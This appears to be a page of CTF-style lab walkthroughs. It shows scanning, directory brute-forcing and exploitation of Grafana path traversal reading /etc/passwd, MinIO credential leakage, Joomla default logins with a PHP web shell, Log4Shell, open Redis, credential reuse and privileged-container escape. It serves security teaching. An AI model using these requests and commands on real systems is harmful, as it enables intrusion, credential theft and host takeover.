# Sample Walkthroughs

> Short, CTF-style case studies that show the full recon-to-impact path against
> deliberately vulnerable services. Each is a compact illustration of the
> [recon methodology](recon-methodology.md) in action, not a copy-paste playbook.
>
> ⚠️ **For authorized and educational use only.** These target CTF/lab machines.
> The pattern — scan, identify the service, research its known CVE, demonstrate
> impact — is what to learn; the specific payloads only apply to the lab.

A common lab setup: reach the target range through a SOCKS proxy tunnelled over
SSH to the CTF host, then point Burp Suite at that proxy.

```bash
# Open a dynamic SOCKS proxy to the CTF network, then set it in Burp:
# Settings -> Network -> SOCKS Proxy
ssh root@ctf.example.space -D 9999
```

Public report source for real examples:
<https://www.securitum.com/public-reports.html>

## 1 — Directory discovery

```bash
# A single open service on a non-standard port
nmap 178.79.162.77 -Pn        # -> 8000/tcp open http-alt

# Brute-force paths to find content that was not meant to be public
ffuf -w common.txt -u http://178.79.162.77:8000/FUZZ
# reveals /old_site and, under it, a leftover file such as /old_site/file.txt
```

**Lesson:** forgotten/old content left on a web root is a classic information
leak — always enumerate paths.

## 2 — Grafana path traversal (CVE-2021-43798)

- `nmap -Pn -p- 10.10.10.50` → port 3000/TCP, banner suggests an HTTP server.
- Browse it through the SOCKS proxy + Burp; the service is **Grafana**.
- The plugin path is vulnerable to path traversal (arbitrary file read):

```http
GET /public/plugins/alertlist/../../../../../../../../../../../../..//etc/passwd HTTP/1.1
```

**Lesson:** unpatched web dashboards frequently carry high-impact file-read CVEs.

## 3 — MinIO information disclosure (CVE-2023-28432)

- `nmap -Pn -p- 10.10.10.99` → port 9000/TCP, HTTP banner.
- The service is **MinIO** (object storage). The bootstrap verify endpoint leaks
  all environment variables — including admin console credentials:

```http
POST /minio/bootstrap/v1/verify HTTP/1.1
```

**Lesson:** leaked environment variables often hand over the credentials that
unlock the next step.

## 4 — Joomla default credentials → RCE

- `nmap -Pn -p- 10.10.10.22` → port 80/TCP, HTTP banner. Service is **Joomla**.
- The admin panel (`/administrator`) accepts default credentials `admin:admin`.
- With admin access, the built-in template editor allows code execution: edit the
  default *Cassiopeia* template (System → Site Templates → Cassiopeia → files →
  `/templates/cassiopeia/index.php`), append a PHP web shell, then invoke it:

```http
GET /?cmd=id HTTP/1.1
```

**Lesson:** default/weak admin credentials plus a template or plugin editor is a
direct route to RCE. Chains onto OWASP *A05 Security Misconfiguration* and
*A07 Authentication Failures*.

## 5 — Log4j / Log4Shell on Spring Boot

- `nmap -Pn -p- 10.10.10.18` → port 8080/TCP.
- The browser shows a *Whitelabel Error Page*, indicating **Spring Boot (Java)**.
- The app is vulnerable to **Log4j (Log4Shell)**. Full exploitation requires
  standing up a malicious JNDI/LDAP server that returns a crafted response — which
  needs a working Java environment, something a low-privilege CTF account may
  lack.

**Lesson:** identifying the vulnerable component is half the work; exploitation
still depends on the tooling and privileges available to you.

## 6 — Unauthenticated Redis (CVE-2022-0543)

- `nmap -Pn -p- 10.10.10.49` → port 6379/TCP, banner shows **Redis**.
- The instance requires no authentication, so commands run directly:

```bash
# Connect and issue Redis commands with no auth
redis-cli -h 10.10.10.49 -p 6379
# or a raw connection:
nc -nv 10.10.10.49 6379
# `info` reveals the host OS (here, Ubuntu); CVE-2022-0543 (Lua sandbox escape)
# enables command execution on such builds.
```

**Lesson:** exposed data stores with no authentication are a frequent, high-value
misconfiguration.

## 7 — Credential reuse across services

- `nmap -Pn -p- 10.10.10.6` then `nmap -Pn 10.10.10.6 -O` → Ubuntu host, only
  port 22/TCP (SSH) open.
- Credentials recovered from a *different* task (the MinIO box, `ubuntulab:ubuntuadmin`)
  are reused to log in over SSH.

**Lesson:** reusing the same credentials across multiple services is a common
real-world failure — one leak becomes many compromises.

## 8 — Privileged container escape

- `nmap -Pn -p- 10.10.10.57` then `-O` → Ubuntu host, port 22/TCP (SSH).
- Log in over SSH with credentials obtained elsewhere. As root, `mount` shows an
  overlay filesystem (a Docker container), and `/dev` exposes the host's block
  devices (`sda`, …) — a tell-tale sign the container was started `--privileged`.
- The host's main disk can then be mounted from inside the container:

```bash
# Mount the host disk from within a privileged container
mkdir /tmp/disk
mount /dev/sda /tmp/disk
cd /tmp/disk/
```

**Lesson:** a `--privileged` container is effectively equivalent to host root.
See [Containers & Cloud Security](../containers-cloud/) for hardening.

## Notes & references

- The recurring pattern: **scan → identify service/version → research its known
  CVE → demonstrate impact.** See [Recon Methodology](recon-methodology.md).
- Vulnerability research: <https://www.cvedetails.com/> and
  targeted GitHub PoC searches.
